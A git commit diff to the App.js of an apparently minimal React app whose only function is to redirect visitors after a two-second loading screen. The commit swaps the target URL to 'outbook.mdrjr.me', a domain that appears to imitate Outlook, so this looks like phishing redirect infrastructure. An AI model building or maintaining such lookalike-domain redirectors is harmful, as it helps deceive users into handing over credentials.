7e55589a2f8926a11c2ff8f49ca6fd33e6a9613a
husknet <127146284+husknet@users.noreply.github.com>
2024-12-03 15:39:36 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://rlct.galfioneycia.com.ar/';
+            window.location.href = 'https://outbook.mdrjr.me/';
         }, 2000);
 
         return () => clearTimeout(timer);
